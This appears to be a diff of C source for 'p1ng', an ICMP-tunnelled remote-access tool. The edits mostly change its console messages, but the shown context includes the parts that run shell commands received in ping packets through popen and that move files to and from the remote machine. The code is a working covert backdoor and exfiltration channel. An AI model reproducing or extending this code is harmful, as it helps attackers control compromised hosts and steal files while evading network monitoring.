@@ -118,7 +118,7 @@ uint8_t unpack(uint8_t *buf, uint8_t len) {
     len -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
     if (len < 8) /*小于ICMP报头长度则不合理*/
     {
-        printf("ICMP packets\'s length is less than 8\n");
+        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
         return -1;
     }
     if ((icmp->icmp_type == ICMP_ECHOREPLY) && (icmp->icmp_id == pid)) {
@@ -159,7 +159,7 @@ uint8_t unpack_p1ng(uint8_t *buf, uint8_t len) {
     len -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
     if (len < 8) /*小于ICMP报头长度则不合理*/
     {
-        printf("\033[40;31m[-]\033[0mICMP packets too short!\n");
+        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
         return -1;
     }
     /*确保所接收的是目标主机所发的的ICMP的回应*/
@@ -182,7 +182,7 @@ uint8_t p1ng_write_file(uint8_t *buf, uint8_t len, FILE *file) {
     len -= iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
     if (len < 8)
     {
-        printf("\033[40;31m[-]\033[0mICMP packets too short!\n");
+        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
         return -1;
     }
     /*确保所接收的是目标主机所发的的ICMP的回应*/
@@ -201,7 +201,7 @@ uint8_t p1ng_write_file(uint8_t *buf, uint8_t len, FILE *file) {
     }
     
     else{
-        printf("[!]Detected unsupport ICMP-type package!\n");
+        printf("\033[40;33m[!]\033[0mDetected unsupport ICMP-type package!\n");
     }
     
     return buf[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+1];
@@ -211,11 +211,10 @@ uint8_t check_target(uint16_t seq_num) {
     uint8_t pkt_size;
     pkt_size = pack(seq_num);
     if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
-        printf("\033[40;33m[!]\033[0mcheck_target->sendto!\n");
+		return 1;
     }
     sleep(1);
     pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
-    //printf(">%d<\n",pkt_size);
     if (unpack(recvpacket, pkt_size) == -1) {
         return 1;
     }else{
@@ -273,14 +272,14 @@ void execute_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
     pack_size = recvpkt_len - iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
     if (pack_size < 8) /*小于ICMP报头长度则不合理*/
     {
-        printf("\033[40;33m[!]\033[0mMalformed ICMPHDR Packet !\n");
+        printf("\033[40;33m[!]\033[0mMalformed packet!\n");
         return ;
     }
 
 //命令执行
     fp = popen(recvpkt+iphdrlen+28,"r");//28=24+4个校验位
     if(fp==NULL){
-        printf("popen error!\n");
+        printf("\033[40;31m[-]\033[0m popen error!\n");
     }
     while(fgets(data,sizeof(data),fp)!=NULL){
         seq_id++;
@@ -353,13 +352,13 @@ void upload_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
     pack_size = recvpkt_len - iphdrlen; /*ICMP报头及ICMP数据报的总长度*/
     if (pack_size < 8) /*小于ICMP报头长度则不合理*/
     {
-        printf("\033[40;33m[!]\033[0mMalformed ICMPHDR Packet !\n");
+        printf("\033[40;33m[!]\033[0mMalformed packet!\n");
         return ;
     }
 	strncpy(filename,recvpkt+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4,recvpkt_len);
     FILE *fp = fopen(filename,"r");
     if(fp==NULL){
-        printf("fopen error!\n");
+        printf("\033[40;31m[-]\033[0mfopen error!\n");
     }
 
     //构建文件包并发送
@@ -443,7 +442,7 @@ void download_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
     
     if(fp == NULL)
     {
-        printf("open error!\n");
+        printf("\033[40;31m[-]\033[0mfopen error!\n");
         return ;
     }
     
@@ -479,7 +478,7 @@ void download_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
     memcpy(sendpkt+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4,filename,strlen(filename)); //剩余位置拷入本地文件名  
     send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
     if( sendto(sockfd, sendpkt, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
-        printf("\033[40;33m[!]\033[0mcheck_target->sendto!\n");
+        printf("\033[40;31m[-]\033[0msendto error!\n");
     }
 
 }
@@ -490,7 +489,7 @@ void execute_requester(uint8_t *cmd, uint16_t seq_num){
     uint8_t send_doneyet=1,recv_doneyet=1;
     uint8_t count = 0;
     if(strlen(cmd)<=1){
-        printf("\033[40;33m[!]\033[0m shellcmd(%s) too short, right?\n", cmd);
+        printf("\033[40;33m[!]\033[0m shellcmd(%s) seems to be wrong, please check again!\n", cmd);
         return ;
     }
     while(send_doneyet){
@@ -498,7 +497,7 @@ void execute_requester(uint8_t *cmd, uint16_t seq_num){
         (void)snprintf(payload, ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_SHELLCMD, send_doneyet, count, (uint8_t)strlen(cmd), cmd);
         pkt_size = pack_p1ng(seq_num, payload, strlen(payload), ICMP_ECHO);
         if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
-            printf("\033[40;33m[!]\033[0mcheck_target->sendto!\n");
+            printf("\033[40;31m[-]\033[0msendto error!\n");
         }
         send_doneyet=0;
 		memset(sendpacket,0,sizeof(sendpacket));
@@ -523,13 +522,13 @@ void upload_requester(uint8_t *cmd, uint16_t seq_num){
     strftime(filename,sizeof(filename),"%04Y%02m%02d%H%M%S.p1ng",tmp_time);
 	
     if(strlen(cmd)<=1){
-        printf("\033[40;33m[!]\033[0m uploadfile(%s) too short, right?\n", cmd);
+        printf("\033[40;33m[!]\033[0m filename(%s) seems to be wrong, please check again!\n", cmd);
         return ;
     }
     FILE *fp = fopen(filename, "wb");
     if(fp == NULL)
     {
-        printf("open error!\n");
+        printf("\033[40;31m[-]\033[0mfopen error!\n");
         return ;
     }
     while(send_doneyet){//@todo 这里只是一个假的循环，后面为长文件名提供支持。
@@ -538,7 +537,7 @@ void upload_requester(uint8_t *cmd, uint16_t seq_num){
         (void)snprintf(payload, ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_UPLOAD, send_doneyet, count, (uint8_t)strlen(cmd), cmd);
         pkt_size = pack_p1ng(seq_num, payload, strlen(payload), ICMP_ECHO);
         if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
-            printf("\033[40;33m[!]\033[0mcheck_target->sendto!\n");
+            printf("\033[40;31m[-]\033[0msendto error!\n");
         }
         send_doneyet=0;
 		memset(sendpacket,0,sizeof(sendpacket));
@@ -548,7 +547,7 @@ void upload_requester(uint8_t *cmd, uint16_t seq_num){
         pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
         recv_doneyet = p1ng_write_file(recvpacket, pkt_size, fp);
     }
-    printf("\033[40;36m[#]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
+    printf("\033[40;36m[*]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
     fclose(fp);
 }
 
@@ -565,13 +564,13 @@ void download_requester(uint8_t *cmd, uint16_t seq_num){
 
 
     if(strlen(cmd)<=1){
-        printf("\033[40;33m[!]\033[0m Filename(%s) illegal!\n", cmd);
+        printf("\033[40;33m[!]\033[0m Filename(%s) seems to be wrong, please check again!\n", cmd);
         return ;
     }
 
     FILE *fp = fopen(cmd,"r");
     if(fp==NULL){
-        printf("fopen error!\n");
+        printf("\033[40;31m[-]\033[0mfopen error!\n");
 		return;
     }
 
@@ -585,7 +584,7 @@ void download_requester(uint8_t *cmd, uint16_t seq_num){
         pkt_size = pack_p1ng(seq_num, payload, ret+4, ICMP_ECHO);
 		
         if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
-            printf("\033[40;33m[!]\033[0mcheck_target->sendto!\n");
+            printf("\033[40;31m[-]\033[0msendto error!\n");
         }
 		//临时清缓存
         memset(data,0,sizeof(data));
@@ -601,7 +600,7 @@ void download_requester(uint8_t *cmd, uint16_t seq_num){
     memcpy(payload+4,data,sizeof(data)-1);
     pkt_size = pack_p1ng(seq_num, payload, ICMP_DATA_LEN-8, ICMP_ECHO);
     if( sendto(sockfd, sendpacket, pkt_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
-        printf("\033[40;33m[!]\033[0mcheck_target->sendto!\n");
+        printf("\033[40;31m[-]\033[0msendto error!\n");
     }
 
     while(recv_doneyet){
@@ -613,7 +612,7 @@ void download_requester(uint8_t *cmd, uint16_t seq_num){
             strncpy(filename,recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+4,recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3]);
             filename[recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+8+3]]='\0';
     }
-    printf("\033[40;36m[#]\033[0mDownload completed. Remote filename: \033[40;36m%s\033[0m\n", filename);
+    printf("\033[40;36m[*]\033[0mDownload completed. Remote filename: \033[40;36m%s\033[0m\n", filename);
 
 }
 
@@ -658,14 +657,13 @@ void p1ng_server(char *client_ip){
     /*设置ICMP的标志符*/
     pid = getpid();
     if(check_target(count)){
-        printf("[-]Target(%s) unreachable!\n", client_ip);
+        printf("\033[40;31m[-]\033[0mTarget(%s) unreachable!\n", client_ip);
         exit(0);
     }
     print_logo();
     char p1ngcmd[100];
     int status=0;
     while(1){
-        //printf("%s$>",client_ip);
         count++;
         printf("\033[40;32mp1ng$>\033[0m");
         fgets(p1ngcmd,50-1,stdin);
@@ -682,7 +680,7 @@ void p1ng_server(char *client_ip){
         } else if (strcmp(p1ngcmd,"\0") ==0){
             continue;
         } else {
-            printf("\033[40;33m[!]\033[0munknow command!%x\n",p1ngcmd[0]);
+            printf("\033[40;33m[!]\033[0munknow command! %c%c%c..\n",p1ngcmd[0],p1ngcmd[1],p1ngcmd[2]);
             continue;
         }
         
@@ -719,11 +717,11 @@ void p1ng_client(){
         st_ip = (struct ip *) recvpacket;
         strcpy(ip_src,inet_ntoa(st_ip->ip_src));
         strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
-        printf("\033[40;34m[*]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
+        printf("\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
         iphdr_len = st_ip->ip_hl << 2;
         icmptotal_len = pkt_size - iphdr_len;
         if( icmptotal_len < 8){
-            printf("[-]Malformed Message!\n");
+            printf("\033[40;31m[-]\033[0mMalformed Message!\n");
             return;
         }
         else
@@ -778,11 +776,10 @@ int main(int argc, char *argv[]){
         exit(0);
     }
     if(btn_s){
-        printf("[+]server_mode on!\n");
         p1ng_server(client_ip);
     }
     if(btn_c){
-        printf("[+]client_mode on!\n");
+        printf("[+]waiting for connection...\n");
         p1ng_client();
     }
 
